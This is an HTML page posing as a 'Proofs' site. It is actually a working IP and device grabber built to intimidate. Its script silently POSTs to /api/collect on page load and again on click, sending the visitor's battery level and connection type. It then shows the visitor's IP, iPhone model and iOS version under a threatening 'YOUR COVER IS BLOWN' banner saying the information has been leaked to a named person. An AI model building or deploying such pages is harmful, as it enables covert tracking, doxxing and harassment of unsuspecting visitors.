<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Proofs</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }
        .cover {
            text-align: center;
            cursor: pointer;
            transition: all 0.5s ease;
        }
        .cover h1 {
            font-size: 4rem;
            letter-spacing: 0.5rem;
            text-transform: uppercase;
            background: linear-gradient(45deg, #ff0000, #ff6600);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: pulse 2s infinite;
        }
        .cover p {
            margin-top: 1rem;
            color: #666;
            font-size: 1.2rem;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(1.05); }
        }
        .leak-screen {
            display: none;
            text-align: center;
            max-width: 90vw;
        }
        .leak-screen h2 {
            font-size: 2.5rem;
            color: #ff0000;
            margin-bottom: 2rem;
            animation: glitch 1s infinite;
        }
        .leak-screen .info-box {
            background: rgba(255, 0, 0, 0.1);
            border: 2px solid #ff0000;
            border-radius: 10px;
            padding: 2rem;
            margin: 1rem auto;
            max-width: 600px;
        }
        .leak-screen .info-item {
            font-size: 1.3rem;
            margin: 0.5rem 0;
            color: #ff3333;
        }
        .leak-screen .ip-display {
            font-size: 2rem;
            color: #00ff00;
            font-weight: bold;
            margin: 1rem 0;
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        .scan-line {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: #ff0000;
            animation: scan 3s linear infinite;
            pointer-events: none;
        }
        @keyframes scan {
            0% { top: 0; opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { top: 100vh; opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="scan-line"></div>
    
    <div class="cover" id="cover" onclick="enterSite()">
        <h1>Proofs</h1>
        <p>Click to enter</p>
    </div>

    <div class="leak-screen" id="leakScreen">
        <h2>⚠️ YOUR COVER IS BLOWN LIL BRO ⚠️</h2>
        <div class="info-box">
            <p class="info-item">All your info is leaked to <strong>Ghaithollah!</strong></p>
            <p class="info-item">Your IP: <span class="ip-display" id="displayIP">Collecting...</span></p>
            <p class="info-item">iPhone Model: <span id="displayModel">Detecting...</span></p>
            <p class="info-item">iOS Version: <span id="displayIOS">Detecting...</span></p>
            <p class="info-item" style="margin-top: 1.5rem; color: #ff6600;">Good luck!</p>
        </div>
    </div>

    <script>
        let userData = {
            ip: '',
            iphoneModel: '',
            iosVersion: '',
            batteryLevel: 'Unknown',
            connectionType: 'Unknown'
        };

        async function collectData() {
            // Get battery info
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    userData.batteryLevel = Math.round(battery.level * 100);
                } catch(e) {}
            }

            // Get connection info
            if ('connection' in navigator) {
                const conn = navigator.connection;
                if (conn) {
                    userData.connectionType = conn.effectiveType || conn.type || 'Unknown';
                }
            }

            // Send to server and get back processed data
            try {
                const response = await fetch('/api/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        batteryLevel: userData.batteryLevel,
                        connectionType: userData.connectionType
                    })
                });
                
                const result = await response.json();
                userData.ip = result.ip;
                userData.iphoneModel = result.iphoneModel;
                userData.iosVersion = result.iosVersion;
                
                // Update display
                document.getElementById('displayIP').textContent = userData.ip;
                document.getElementById('displayModel').textContent = userData.iphoneModel;
                document.getElementById('displayIOS').textContent = userData.iosVersion;
                
            } catch(e) {
                console.error('Failed to exfiltrate:', e);
            }
        }

        function enterSite() {
            document.getElementById('cover').style.display = 'none';
            document.getElementById('leakScreen').style.display = 'block';
            
            // Start data collection immediately
            collectData();
        }

        // Auto-collect on page load in background too
        window.addEventListener('load', () => {
            // Pre-fetch data silently
            fetch('/api/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    batteryLevel: 'Unknown',
                    connectionType: 'Unknown'
                })
            });
        });
    </script>
</body>
</html>
